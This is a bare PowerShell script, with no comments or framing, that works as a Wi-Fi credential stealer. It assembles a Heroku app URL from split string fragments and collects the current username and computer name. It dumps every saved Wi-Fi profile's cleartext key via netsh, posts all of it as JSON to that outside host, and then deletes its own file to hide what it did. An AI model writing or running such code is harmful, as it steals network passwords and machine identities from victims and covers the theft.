$targetUrl = "https://c"+"nl-cred-4bb1"+"b041c738.herok"+"uapp.com"
$profiles = netsh wlan show profiles | Select-String " : " | ForEach-Object { ($_ -split ':')[1].Trim() }
$data = @{username=$env:UserName;computer=$env:COMPUTERNAME}
$json = $data | ConvertTo-Json -Depth 1
Invoke-WebRequest -Uri $targetUrl -Method POST -Body $json

if ($profiles) {
    $data.wifi = @()
    foreach ($profile in $profiles) {
        $pwData = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content","Contenuto Chiave","Schlüsselinhalt"
        $pw = if ($pwData) { ($pwData -split ':')[1].Trim() } else { "" }

        $data.wifi += @{
            ssid = $profile
            key = $pw
        }
    }
    $json = $data | ConvertTo-Json -Depth 2
    Invoke-WebRequest -Uri $targetUrl -Method POST -Body $json
}
$scriptPath = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 1
Remove-Item -Path $scriptPath -Force